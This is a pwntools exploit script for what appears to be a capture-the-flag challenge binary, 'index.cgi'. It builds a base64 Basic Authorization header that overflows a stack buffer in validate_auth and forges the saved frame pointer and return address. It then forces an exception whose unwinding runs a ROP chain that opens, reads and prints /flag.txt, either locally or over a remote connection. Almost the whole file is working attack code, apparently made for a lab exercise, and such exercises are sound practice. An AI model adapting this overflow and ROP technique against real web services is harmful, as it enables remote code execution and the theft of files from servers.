#!/usr/bin/env python3

from pwn import *
import base64
import os
import re

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('index.cgi', checksec=False)
context.binary = exe

HOST = args.HOST or '0'
PORT = int(args.PORT or 32367)

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

FLAG_RE = re.compile(rb"(?:grey|flag|ctf|nusgreyhats)\{[^}\r\n\x00]{1,200}\}", re.I)

# validate_auth stack layout
OFF_SAVED_RBP = 0x110
OFF_SAVED_RIP = 0x118
OFF_ROP = 0x158

# source-built static binary profile for this challenge
POP_RDI = 0x402514
POP_RSI = 0x401cde
POP_RDX_RBX = 0x482677

OPEN = 0x44dfe0
READ = 0x44e070
WRITE = 0x44e0b0
EXIT = 0x44d6f0

PATH_FLAG = 0x490131
HEADER = 0x4900fb
BSS = 0x4ca760
FAKE_RBP = 0x4caf60

UNWIND_RIPS = [0x4086e0, 0x4086dc, 0x4086df]


def GDB():
    if not args.REMOTE and args.GDB:
        gdb.attach(p, gdbscript='''
        b *validate_auth
        b *decode_base64
        catch throw
        c
        ''')
        sleep(1)


def write_rop(fd, buf, size):
    return flat(
        POP_RDI, fd,
        POP_RSI, buf,
        POP_RDX_RBX, size, 0,
        WRITE,
    )


def build_rop():
    rop = b''

    # write("Content-Type: text/plain\n")
    rop += write_rop(1, HEADER, len(b'Content-Type: text/plain\n'))

    # write("\n") so CGI response becomes \n\n before body
    rop += write_rop(1, HEADER + len(b'Content-Type: text/plain\n') - 1, 1)

    # open("/flag.txt", 0)
    rop += flat(
        POP_RDI, PATH_FLAG,
        POP_RSI, 0,
        OPEN,
    )

    # read(3, BSS, 0x80)
    rop += flat(
        POP_RDI, 3,
        POP_RSI, BSS,
        POP_RDX_RBX, 0x80, 0,
        READ,
    )

    # write(1, BSS, 0x80)
    rop += flat(
        POP_RDI, 1,
        POP_RSI, BSS,
        POP_RDX_RBX, 0x80, 0,
        WRITE,
    )

    # _exit(0)
    rop += flat(
        POP_RDI, 0,
        EXIT,
    )

    return rop


def build_auth(unwind_rip):
    raw = bytearray(b'A' * OFF_ROP) # 0x158
    raw += build_rop()

    raw[:6] = b'admin:'
    raw[OFF_SAVED_RBP:OFF_SAVED_RBP + 8] = p64(FAKE_RBP) # 0x110
    raw[OFF_SAVED_RIP:OFF_SAVED_RIP + 8] = p64(unwind_rip) # 0x118

    # avoid '=' padding, then append invalid base64 so throw happens
    # after the overflow already wrote our fake frame + rop
    while len(raw) % 3:
        raw += b'P'

    return b'Basic ' + base64.b64encode(bytes(raw)) + b'@AAA'


def build_request(auth):
    return (
        b'GET / HTTP/1.1\r\n'
        b'Host: ' + HOST.encode() + b'\r\n'
        b'User-Agent: baby-bof\r\n'
        b'Authorization: ' + auth + b'\r\n'
        b'Connection: close\r\n\r\n'
    )


def start_local(auth):
    env = os.environ.copy()
    env['REQUEST_METHOD'] = 'GET'
    env['HTTP_AUTHORIZATION'] = auth.decode()
    return process([exe.path], env=env)


def start_remote():
    return remote(HOST, PORT)


def try_once(unwind_rip):
    global p

    auth = build_auth(unwind_rip)
    info(f'trying unwind RIP = {hex(unwind_rip)}')
    print('-'*0x100)
    print(auth)
    print('-'*0x100)

    if args.REMOTE:
        p = start_remote()
        s(build_request(auth))
    else:
        p = start_local(auth)

    GDB()
    data = p.recvall(timeout=3)
    return data


def main():
    last = b''

    for rip in UNWIND_RIPS:
        data = try_once(rip)
        last = data

        m = FLAG_RE.search(data)
        if m:
            success(m.group(0).decode())
            return

        if b'Content-Type: text/plain' in data and b'500 Internal Server Error' not in data:
            print(data.decode(errors='replace'))
            return

    print(last.decode(errors='replace'))


if __name__ == '__main__':
    main()
